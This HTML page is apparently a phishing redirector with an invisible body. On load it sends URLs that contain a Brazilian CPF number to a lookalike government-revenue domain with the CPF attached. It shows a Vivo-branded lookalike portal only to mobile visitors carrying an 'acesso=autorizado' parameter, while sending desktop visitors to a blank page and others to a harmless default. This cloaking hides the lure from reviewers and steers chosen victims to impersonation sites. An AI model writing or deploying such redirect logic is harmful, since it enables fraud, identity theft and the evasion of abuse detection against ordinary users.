<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionador</title>
    <style>
        body {
            display: none;
            opacity: 0;
            margin: 0;
            padding: 0;
        }
    </style>
    <script>
        window.onload = function() {
            // 1. Verificar se é uma rota com CPF (ex: /06537080177)
            const currentPath = window.location.pathname;
            const cpfMatch = currentPath.match(/^\/(\d{11})$/);
            
            if (cpfMatch) {
                // Se encontrou CPF na slug, redirecionar para o site da Receita
                const cpf = cpfMatch[1];
                const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
                console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
                window.location.href = receitaUrl;
                return;
            }
            
            // 2. Verificar se tem o parâmetro dashboard
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('dashboard') === 'true') {
                window.location.href = '/dashboard';
                return;
            }
            
            // 3. Verificar se tem o parâmetro de acesso=autorizado
            const hasAuthParam = urlParams.get('acesso') === 'autorizado';
            
            // 4. Verificar se é dispositivo móvel
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            // 5. Determinar para onde redirecionar
            let redirectUrl = 'https://atendimentovivo.gupy.io'; // URL padrão (não autorizado)
            
            if (hasAuthParam) {
                // Se tem o parâmetro autorizado
                if (isMobile) {
                    // Em dispositivo móvel, vai para o domínio correto
                    redirectUrl = 'https://portal.vivo-cadastro.com?acesso=autorizado';
                } else {
                    // Em desktop, vai para about:blank
                    redirectUrl = 'about:blank';
                }
            }
            
            // 6. Fazer o redirecionamento
            console.log('Redirecionando para:', redirectUrl, 'é móvel:', isMobile, 'é autorizado:', hasAuthParam);
            window.location.href = redirectUrl;
        };
    </script>
</head>
<body>
    <!-- Sem conteúdo visível -->
</body>
</html>